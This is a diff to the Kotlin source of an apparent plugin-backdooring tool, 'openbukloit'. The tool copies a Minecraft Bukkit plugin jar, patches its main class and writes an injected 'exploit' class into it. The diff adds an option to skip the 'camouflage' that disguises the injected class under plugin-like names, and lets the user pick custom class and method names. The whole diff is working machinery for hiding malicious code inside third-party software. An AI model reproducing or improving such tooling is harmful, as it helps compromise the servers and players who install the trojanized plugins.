@@ -11,10 +11,20 @@ import utils.*
 import java.io.File
 import java.lang.management.ManagementFactory
 import java.nio.file.*
+import kotlin.io.path.createDirectory
+import kotlin.io.path.exists
 import kotlin.io.path.inputStream
 import kotlin.io.path.writeBytes
 
-fun process(input: File, output: File, exploit: ClassFile, replace: Boolean) {
+fun process(
+    input: File,
+    output: File,
+    exploit: ClassFile,
+    replace: Boolean,
+    noCamouflage: Boolean,
+    className: String?,
+    methodName: String?
+) {
     Logs.task("Processing ${input.name}")
     if (!replace && output.exists()) {
         Logs.finish().warn("Skipped plugin because output file already exists")
@@ -24,7 +34,10 @@ fun process(input: File, output: File, exploit: ClassFile, replace: Boolean) {
     if (tempJar.exists()) tempJar.delete()
     input.copyTo(tempJar)
 
-    val camouflage = calculateCamouflage(tempJar)
+    val camouflage = if (noCamouflage)
+        Camouflage(className?.replace(".", "/") ?: exploit.name, methodName ?: "inject")
+    else
+        calculateCamouflage(tempJar)
 
     var fileSystem = FileSystems.newFileSystem(tempJar.toPath(), null)
 
@@ -76,7 +89,8 @@ fun process(input: File, output: File, exploit: ClassFile, replace: Boolean) {
     )
     File("./.openbukloit/temp/patched").deleteRecursively()
 
-    Logs.info("Applying camouflage...")
+    if (noCamouflage) Logs.info("Renaming exploit class...")
+    else Logs.info("Applying camouflage...")
     val patchedMainClass = ClassFile(fileSystem.getPath("/$pluginMainClassFile").inputStream().readBytes())
     for (entry in patchedMainClass.constantPool.entries) {
         if (entry is ConstantClass) {
@@ -113,6 +127,11 @@ fun process(input: File, output: File, exploit: ClassFile, replace: Boolean) {
         }
     }
     Files.delete(fileSystem.getPath("$tempExploitName.class"))
+
+    if (camouflage.className.contains("/")) {
+        val dir = fileSystem.getPath("${camouflage.className}.class").parent
+        if (!dir.exists()) dir.createDirectory()
+    }
     fileSystem.getPath("${camouflage.className}.class").writeBytes(exploit.compile())
 
     fileSystem.close()
